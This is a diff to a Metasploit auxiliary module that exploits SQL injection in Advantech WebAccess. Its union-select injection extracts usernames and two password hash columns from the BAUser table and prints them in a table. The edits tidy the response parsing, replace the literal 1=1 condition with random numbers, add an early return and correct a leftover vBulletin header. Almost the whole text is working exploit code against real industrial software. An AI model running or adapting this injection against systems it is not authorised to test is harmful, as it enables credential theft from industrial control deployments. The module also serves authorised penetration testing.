@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       'data'      => xml
     })
 
-    unless res and res.code == 200 and res.body.to_s =~ /#{mark}/
+    unless res && res.code == 200 && res.body && res.body.include?(mark)
       return nil
     end
 
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
   def parse_users(xml, mark)
     doc = Document.new(xml)
 
-    strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string")
+    strings = XPath.match(doc, "s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string").map(&:text)
     strings_length = strings.length
 
     unless strings_length > 1
@@ -110,13 +110,13 @@ class Metasploit3 < Msf::Auxiliary
 
     i = 0
     strings.each do |result|
-      next if result.text == mark
+      next if result == mark
       if i < (strings_length / 3)
-        @users.push(result.text)
+        @users.push(result)
       elsif i < (strings_length / 3) * 2
-        @passwords.push(result.text)
+        @passwords.push(result)
       else
-        @passwords2.push(result.text)
+        @passwords2.push(result)
       end
       i = i + 1
     end
@@ -126,13 +126,14 @@ class Metasploit3 < Msf::Auxiliary
   def run
     print_status("#{peer} - Exploiting sqli to extract users information...")
     mark = Rex::Text.rand_text_alpha(8 + rand(5))
+    rand = Rex::Text.rand_text_numeric(2)
     # While installing I can only configure an Access backend, but
     # according to documentation other backends are supported. This
     # injection should be compatible, hopefully, with most backends.
     injection =  "#{Rex::Text.rand_text_alpha(8 + rand(5))}' "
-    injection << "union all select UserName from BAUser where 1=1 "
-    injection << "union all select Password from BAUser where 1=1 "
-    injection << "union all select Password2 from BAUser where 1=1 "
+    injection << "union all select UserName from BAUser where #{rand}=#{rand} "
+    injection << "union all select Password from BAUser where #{rand}=#{rand} "
+    injection << "union all select Password2 from BAUser where #{rand}=#{rand} "
     injection << "union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}"
     data = do_sqli(injection, mark)
 
@@ -150,12 +151,13 @@ class Metasploit3 < Msf::Auxiliary
 
     if @users.empty?
       print_error("#{peer} - Users not found")
+      return
     else
       print_good("#{peer} - #{@users.length} users found!")
     end
 
     users_table = Rex::Ui::Text::Table.new(
-      'Header'  => 'vBulletin Users',
+      'Header'  => 'Advantech WebAccess Users',
       'Ident'   => 1,
       'Columns' => ['Username', 'Password Hash', 'Password Hash 2']
     )
